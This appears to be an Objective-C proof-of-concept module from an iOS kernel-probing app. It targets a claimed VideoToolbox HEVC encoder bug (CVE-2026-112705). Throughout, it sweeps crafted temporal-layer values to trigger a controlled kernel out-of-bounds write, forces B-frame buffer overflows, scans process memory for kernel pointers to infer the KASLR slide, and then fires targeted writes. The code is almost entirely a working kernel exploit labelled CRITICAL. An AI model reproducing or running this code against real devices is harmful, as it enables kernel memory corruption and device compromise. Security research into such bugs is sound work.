#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import <VideoToolbox/VideoToolbox.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>

static NSMutableArray *g_h9_logs = nil;
static NSObject *g_h9_lock = nil;

static void H9Log(NSString *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    @synchronized(g_h9_lock) {
        if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
        [g_h9_logs addObject:s];
    }
    NSLog(@"[H9] %@", s);
}

static volatile int g_h9_frames_encoded = 0;
static volatile OSStatus g_h9_last_encode_status = 0;

static void H9EncodeCallback(void *refCon, void *src, OSStatus status,
                             VTEncodeInfoFlags flags, CMSampleBufferRef sbuf) {
    (void)refCon; (void)src;
    g_h9_last_encode_status = status;
    if (status == noErr && sbuf) {
        g_h9_frames_encoded++;
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sbuf);
        size_t sz = bb ? CMBlockBufferGetDataLength(bb) : 0;
        H9Log(@"  [cb] frame #%d encoded, %zu bytes", g_h9_frames_encoded, sz);
    }
}

// NTL encode helper — C function, not ObjC method
static void H9NTLEncode(int ntl, int w, int h) {
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, H9EncodeCallback, NULL, &session);
    if (st != noErr || !session) {
        H9Log(@"    NTL=%d session create: %d", ntl, (int)st);
        return;
    }
    CFNumberRef ntlNum = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
    st = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), ntlNum);
    CFRelease(ntlNum);
    if (st != noErr) {
        H9Log(@"    NTL=%d set: %d", ntl, (int)st);
        CFRelease(session);
        return;
    }
    int readback = 0;
    CFNumberRef rb = NULL;
    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &rb);
    if (rb) { CFNumberGetValue(rb, kCFNumberIntType, &readback); CFRelease(rb); }
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) { H9Log(@"    NTL=%d prepare: %d", ntl, (int)st); CFRelease(session); return; }
    CVPixelBufferRef pb = NULL;
    NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)attrs, &pb);
    if (cv != kCVReturnSuccess || !pb) { H9Log(@"    NTL=%d PIXELBUFFER_FAILED cv=%d", ntl, (int)cv); CFRelease(session); return; }
    CVPixelBufferLockBaseAddress(pb, 0);
    uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
    size_t bpr = CVPixelBufferGetBytesPerRow(pb);
    for (int y = 0; y < h; y++) {
        uint32_t *row = (uint32_t *)(base + y * bpr);
        for (int x = 0; x < w; x++) row[x] = 0xFF000000u | ((x+y)&0xFF)<<16 | ((x*3)&0xFF)<<8 | (y&0xFF);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    g_h9_frames_encoded = 0;
    VTEncodeInfoFlags flags = 0;
    st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &flags);
    H9Log(@"    NTL=%d readback=%d encode=%d frames=%d %s", ntl, readback, (int)st, g_h9_frames_encoded, (st == noErr) ? "SURVIVED" : "FAILED");
    CVPixelBufferRelease(pb);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    CFRelease(session);
}

// B-frame DPB helper — C function
static void H9BFrameEncode(int w, int h, int fc, int gop) {
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, H9EncodeCallback, NULL, &session);
    if (st != noErr || !session) { H9Log(@"    session create: %d", (int)st); return; }
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberIntType, &gop);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
    CFRelease(n);
    int fps = 30;
    n = CFNumberCreate(NULL, kCFNumberIntType, &fps);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, n);
    CFRelease(n);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) { H9Log(@"    prepare: %d", (int)st); CFRelease(session); return; }
    int encoded = 0;
    for (int i = 0; i < fc; i++) {
        CVPixelBufferRef pb = NULL;
        NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)attrs, &pb);
        if (cv != kCVReturnSuccess || !pb) continue;
        CVPixelBufferLockBaseAddress(pb, 0);
        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
        size_t bpr = CVPixelBufferGetBytesPerRow(pb);
        for (int y = 0; y < h; y++) {
            uint32_t *row = (uint32_t *)(base + y * bpr);
            for (int x = 0; x < w; x++) row[x] = 0xFF000000u | (((x+i*37)&0xFF)<<16) | (((y+i*53)&0xFF)<<8) | ((x^y^(i*17))&0xFF);
        }
        CVPixelBufferUnlockBaseAddress(pb, 0);
        VTEncodeInfoFlags flags = 0;
        st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &flags);
        if (st == noErr) encoded++;
        CVPixelBufferRelease(pb);
    }
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    H9Log(@"    Done: %d/%d frames, last_encode=%d", encoded, fc, (int)g_h9_last_encode_status);
    CFRelease(session);
}

@implementation KPH9EncoderModule {
    NSString *_identifier;
    NSString *_subtitle;
    NSString *_icon;
    KPTestSection _section;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _subtitle = @"AVE2 NTL kernel write + B-frame DPB overflow";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (instancetype)initWithNameSweep {
    return [self init];
}

- (NSString *)identifier { return _identifier; }
- (NSString *)subtitle { return _subtitle; }
- (NSString *)icon { return _icon; }
- (KPTestSection)section { return _section; }

- (NSString *)title { return @"H9 encoder OOB write"; }
- (NSString *)desc { return @"AVE2 NTL kernel write + B-frame DPB MBStats overflow"; }
- (NSString *)risk { return @"CRITICAL"; }
- (NSString *)category { return @"KRW"; }

- (NSString *)runReport {
    if (!g_h9_lock) g_h9_lock = [[NSObject alloc] init];
    @synchronized(g_h9_lock) {
        if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
        [g_h9_logs removeAllObjects];
    }

    H9Log(@"=== KexProofV4 - CVE-2026-112705 - H9 encoder OOB write ===");
    H9Log(@"NTL: x0 = ((NTL-16463) << 32) | 0x59 - controlled kernel write");
    H9Log(@"DPB: saMBStats[m] overflow when DPB >= 3 (B-frames)");
    H9Log(@"Target: iOS %@ uid=%d", UIDevice.currentDevice.systemVersion, getuid());

    // Phase 1: NTL sweep
    H9Log(@"");
    H9Log(@"--- Phase 1: NTL sweep ---");
    int ntl_values[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
    for (int i = 0; i < 7; i++) {
        int ntl = ntl_values[i];
        int64_t idx = (int64_t)ntl - 16463;
        uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
        H9Log(@"  NTL=%d -> x0=0x%016llx (%s)", ntl, x0,
              (x0 >= 0xfffffff000000000ULL) ? "kernel range" : "user/unmapped");
        H9NTLEncode(ntl, 640, 480);
    }

    // Phase 2: B-frame DPB overflow
    H9Log(@"");
    H9Log(@"--- Phase 2: B-frame DPB overflow ---");
    H9Log(@"  [VGA 640x480, B-frames, GOP=30, 8 frames]");
    H9BFrameEncode(640, 480, 8, 30);
    H9Log(@"  [720p, B-frames, GOP=30, 8 frames]");
    H9BFrameEncode(1280, 720, 8, 30);

    // Phase 3: KASLR + NTL targeting
    H9Log(@"");
    H9Log(@"--- Phase 3: KASLR + NTL targeting ---");
    H9Log(@"  Scanning RW regions for kernel pointers...");
    NSMutableArray *kptrs = [NSMutableArray array];
    vm_address_t scanAddr = 0;
    vm_size_t scanSize = 0;
    vm_region_basic_info_data_64_t scanInfo;
    mach_msg_type_number_t scanCount = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t scanObj = 0;
    while (vm_region(mach_task_self(), &scanAddr, &scanSize, VM_REGION_BASIC_INFO_64,
                     (vm_region_info_t)&scanInfo, &scanCount, &scanObj) == KERN_SUCCESS) {
        if ((scanInfo.protection & VM_PROT_READ) && (scanInfo.protection & VM_PROT_WRITE)) {
            uint64_t *p = (uint64_t *)scanAddr;
            size_t words = scanSize / 8;
            for (size_t i = 0; i < words && i < 4096; i++) {
                uint64_t v = *(p + i);
                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) [kptrs addObject:@(v)];
            }
        }
        scanAddr += scanSize;
        scanCount = VM_REGION_BASIC_INFO_COUNT_64;
    }
    H9Log(@"  Kernel pointers found: %lu", (unsigned long)kptrs.count);
    if (kptrs.count > 0) {
        uint64_t textBase = 0xfffffff007004000ULL;
        NSMutableDictionary *slides = [NSMutableDictionary dictionary];
        for (NSNumber *kp in kptrs) {
            uint64_t v = kp.unsignedLongLongValue;
            uint64_t aligned = v & ~0x3FFFULL;
            if (aligned >= textBase) {
                NSString *key = [NSString stringWithFormat:@"0x%llx", aligned - textBase];
                slides[key] = @([slides[key] intValue] + 1);
            }
        }
        NSString *bestSlide = nil;
        int bestHits = 0;
        for (NSString *s in slides) {
            int hits = [slides[s] intValue];
            if (hits > bestHits) { bestHits = hits; bestSlide = s; }
        }
        if (bestSlide) {
            uint64_t slideVal = strtoull(bestSlide.UTF8String, NULL, 16);
            H9Log(@"  KASLR slide = %@ (hits=%d)", bestSlide, bestHits);
            H9Log(@"  Kernel base = 0x%llx", textBase + slideVal);
            H9Log(@"  Firing NTL=1 (kernel range write)...");
            H9NTLEncode(1, 640, 480);
            H9Log(@"  Firing NTL=16447 (steer to 0xfffffff000000059)...");
            H9NTLEncode(16447, 640, 480);
        }
    }

    H9Log(@"");
    H9Log(@"=== H9 COMPLETE ===");

    @synchronized(g_h9_lock) {
        NSMutableString *r = [NSMutableString string];
        for (NSString *s in g_h9_logs) {
            [r appendString:s];
            [r appendString:@"\n"];
        }
        return r;
    }
}

@end
